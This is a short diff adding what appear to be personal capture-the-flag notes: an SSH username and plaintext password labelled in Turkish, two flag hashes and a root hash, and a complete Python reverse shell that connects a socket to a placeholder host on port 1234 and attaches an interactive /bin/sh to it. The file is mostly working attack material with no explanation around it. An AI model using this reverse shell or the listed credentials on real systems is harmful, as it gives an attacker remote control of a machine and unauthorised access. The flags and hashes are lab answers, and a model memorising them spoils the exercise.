@@ -1,0 +1,19 @@
+SSH kullanıcı: mamadou; şifre: Niamey4Ever227!!!
+
+
+Flag 1 : d86b9ad71ca887f4dd1dac86ba1c4dfc
+Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098
+root : 821ae63dbe0c573eff8b69d451fb21bc
+
+------------------------------------------------------------------------------------------
+python reverse shell:
+
+import socket
+import subprocess
+import os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("<localhost>",1234));os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+------------------------------------------------------------------------------------------
